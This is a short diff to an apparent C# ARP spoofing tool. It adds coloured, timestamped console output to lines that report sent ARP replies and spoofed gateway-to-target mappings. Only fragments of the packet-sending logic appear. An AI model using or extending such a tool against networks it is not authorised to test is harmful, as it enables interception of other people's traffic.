@@ -21,11 +21,13 @@ class Program
             return;
         }
 
+        Console.ForegroundColor = ConsoleColor.Magenta;
         for (int i = 0; i < devices.Count; i++)
         {
             var dev = devices[i];
             Console.WriteLine("{0}: Name: {1} | Desc: {2} | Mac: {3}", i, dev.Name, dev.Description, dev.MacAddress);
         }
+        Console.ResetColor();
 
         Console.WriteLine("Select an interface by entering the corresponding number:");
 
@@ -47,8 +49,11 @@ class Program
 
         targetMac = GetMacFromIp(device, targetIp);
         gatewayMac = GetMacFromIp(device, gatewayIp);
+
+        Console.ForegroundColor = ConsoleColor.Cyan;
         Console.WriteLine("Gateway MAC: {0}", gatewayMac);
         Console.WriteLine("Target MAC: {0}", targetMac);
+        Console.ResetColor();
 
         while (true)
         {
@@ -135,8 +140,13 @@ class Program
         ethernetPacket.PayloadPacket = arpRequestToTarget;
         device.SendPacket(ethernetPacket);
 
-        Console.WriteLine($"Sent ARP reply to target: {targetIp} -> {FormatedMac(targetMac)}");
-        Console.WriteLine($"* Spoofed * {gatewayIp} -> {FormatedMac(targetMac)}");
+        Console.ForegroundColor = ConsoleColor.Yellow;
+        Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {FormatedMac(targetMac)}");
+        Console.ResetColor();
+
+        Console.ForegroundColor = ConsoleColor.Green;
+        Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {FormatedMac(targetMac)}");
+        Console.ResetColor();
     }
 
     // Format MAC ADDRESS
